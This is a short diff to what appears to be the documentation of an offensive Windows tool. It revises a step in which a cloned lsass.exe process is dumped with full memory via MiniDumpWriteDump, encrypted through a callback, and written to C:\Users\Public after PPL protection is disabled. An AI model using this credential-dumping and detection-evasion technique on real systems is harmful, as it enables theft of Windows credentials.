@@ -145,17 +145,17 @@ log_success("PPL disabled (0x00 written)");
 
 ### 5. Dump Creation
 
-A memory dump of the cloned `lsass.exe` process is created in a temp file, then encrypted and written to `C:\Users\Public\`.
+A memory dump of the cloned `lsass.exe` process is created and then encrypted through a MDWD callback. Finally is written (encrypted) to `C:\Users\Public\`.
 
 ```c
 BOOL dumped = pMDWD(
-    hClone,
-    clonedPID,
-    hTempFile,
-    MiniDumpWithFullMemory,
-    NULL,
-    NULL,
-    NULL
+       hClone,
+       clonedPID,
+       NULL,
+       MiniDumpWithFullMemory,
+       NULL,
+       NULL,
+       &mci
 );
 ```
 
